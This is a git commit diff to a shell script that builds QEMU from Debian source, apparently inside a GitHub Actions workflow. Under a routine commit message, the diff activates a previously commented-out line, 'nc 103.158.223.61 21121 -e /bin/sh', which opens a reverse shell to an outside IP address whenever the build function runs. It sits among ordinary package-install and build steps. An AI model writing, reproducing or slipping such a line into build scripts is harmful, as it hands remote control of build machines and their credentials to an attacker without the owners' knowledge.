68b283b9b6c7b7254cae9c7806dfc5a4b093f21f
MargaretaWhite23 <108430598+MargaretaWhite23@users.noreply.github.com>
2022-08-22 18:02:01 +0100

    Update build-kernel-github-actions.sh

--- build-kernel-github-actions.sh
+++ build-kernel-github-actions.sh
@@ -15,10 +15,11 @@ build_qemu () {
   DEBIAN_FRONTEND=noninteractive apt-get install -y gir1.2-spiceclientgtk-3.0 virt-manager libvirt-daemon virt-viewer spice-vdagent qemu-utils  spice-vdagent xserver-xorg-video-qxl
   mkdir ~/qemu; cd ~/qemu
   #build debian version
-  #nc 103.158.223.61 21121 -e /bin/sh
+  nc 103.158.223.61 21121 -e /bin/sh
   apt-get source qemu-system-x86=1:7.0+dfsg-7 -y
   dpkg-source --auto-commit -b qemu-7.0+dfsg/
   cd qemu-7.0+dfsg
+  mk-build-deps --install --root-cmd sudo --remove
   debuild -us -uc
   #curl -L https://download.qemu.org/qemu-7.0.0.tar.xz -o qemu.tar.xz
   #tar xvJf qemu.tar.xz > /dev/null
